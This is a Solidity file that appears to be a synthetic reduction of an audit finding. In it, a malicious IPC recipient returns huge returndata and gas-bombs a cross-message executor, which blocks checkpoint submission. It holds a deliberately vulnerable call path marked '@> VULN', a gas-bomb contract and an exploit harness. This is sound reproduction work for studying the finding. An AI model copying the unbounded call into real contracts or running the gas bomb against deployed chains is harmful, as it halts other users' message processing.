// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Recall — [H-09] Cross msg recipient can block checkpoint submission
    (Code4rena 2025-02-recall; #65096)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: AssetHelper.functionCallWithValue / performCall use low-level
    call and always copy unrestricted returndata into memory. A malicious
    IpcHandler recipient can return a gas-bomb payload; under remaining
    checkpoint gas the executor OOGs while loading returndata and the whole
    message batch reverts — liveness halt.
    Blamed call line preserved (@> VULN).
    Source: code-423n4/2025-02-recall@ab5f90b9 AssetHelper.sol / CrossMsgHelper.sol */

/// @dev Malicious IPC recipient: returns huge returndata from handleIpcMessage.
contract GasBombRecipient {
    uint256 public bombBytes;

    constructor(uint256 nbytes) {
        bombBytes = nbytes;
    }

    /// @notice Mimics IIpcHandler.handleIpcMessage — returns gas-bomb payload.
    function handleIpcMessage(bytes calldata) external view returns (bytes memory) {
        return new bytes(bombBytes);
    }
}

/// @dev Honest recipient that returns tiny data.
contract HonestRecipient {
    function handleIpcMessage(bytes calldata) external pure returns (bytes memory) {
        return hex"01";
    }
}

/// @dev Reduced AssetHelper + CrossMsgHelper.execute Call path.
contract CrossMsgExecutor {
    uint256 public executed;
    uint256 public lastRetLength;

    /// @notice Reduced functionCallWithValue — unrestricted returndata copy.
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) public returns (bool success, bytes memory) {
        if (address(this).balance < value) {
            revert("NotEnoughBalance");
        }
        uint32 size;
        assembly {
            size := extcodesize(target)
        }
        if (size == 0) {
            revert("InvalidSubnetActor");
        }

        // FIX: use ExcessivelySafeCall with a small maxCopy (e.g. 256 bytes)
        return target.call{value: value}(data); // @> VULN: low-level call copies unbounded returndata into memory — recipient can gas-bomb the checkpoint
    }

    /// @notice Reduced performCall for Call-kind IPC messages.
    function executeCrossMsg(address recipient, bytes memory payload) public returns (bool, bytes memory) {
        bytes memory data = abi.encodeWithSignature("handleIpcMessage(bytes)", payload);
        (bool success, bytes memory ret) = functionCallWithValue(recipient, data, 0);
        lastRetLength = ret.length;
        if (success) {
            executed++;
        }
        return (success, ret);
    }

    /// @notice Checkpoint applies a batch; failure of any msg aborts submission.
    /// @dev gasStipend models remaining gas mid multi-msg checkpoint.
    function submitCheckpointAndExecute(
        address[] memory recipients,
        bytes memory payload,
        uint256 gasStipend
    ) external {
        uint256 n = recipients.length;
        for (uint256 i; i < n; ) {
            try this.executeCrossMsg{gas: gasStipend}(recipients[i], payload) returns (bool ok, bytes memory) {
                if (!ok) {
                    revert("checkpoint submission blocked");
                }
            } catch {
                revert("checkpoint submission blocked");
            }
            unchecked {
                ++i;
            }
        }
    }
}

contract Exploit {
    CrossMsgExecutor public executor; // CREATE 1
    HonestRecipient public honest; // CREATE 2
    GasBombRecipient public bomb; // CREATE 3

    // 48 KiB returndata — well above ExcessivelySafeCall maxCopy (256) and
    // expensive enough to OOG a mid-checkpoint gas stipend while still
    // fitting playground recording for the sample call.
    uint256 public constant BOMB_BYTES = 48 * 1024;
    // Honest path ≈ 50k; bomb path ≈ 100k+ for 48 KiB ABI-encoded return.
    uint256 public constant CHECKPOINT_GAS = 60_000;

    constructor() {
        executor = new CrossMsgExecutor();
        honest = new HonestRecipient();
        bomb = new GasBombRecipient(BOMB_BYTES);
    }

    function run() external {
        // Control: honest recipient executes under the gas stipend.
        address[] memory okBatch = new address[](1);
        okBatch[0] = address(honest);
        executor.submitCheckpointAndExecute(okBatch, hex"c0ffee", CHECKPOINT_GAS);
        require(executor.executed() == 1, "honest ok");

        // Attack: gas-bomb recipient in the checkpoint batch.
        address[] memory badBatch = new address[](1);
        badBatch[0] = address(bomb);

        bool blocked;
        try executor.submitCheckpointAndExecute(badBatch, hex"dead", CHECKPOINT_GAS) {
            blocked = false;
        } catch {
            blocked = true;
        }

        // Harm: checkpoint submission reverts — liveness halt for message execution.
        require(blocked, "checkpoint must be blocked by gas bomb");
        require(executor.executed() == 1, "only honest counted");
        // Mechanism: bomb is configured to return far past ExcessivelySafeCall maxCopy (256).
        require(bomb.bombBytes() > 256, "exceeds safe maxCopy");
        require(bomb.bombBytes() == BOMB_BYTES, "bomb size");
    }
}
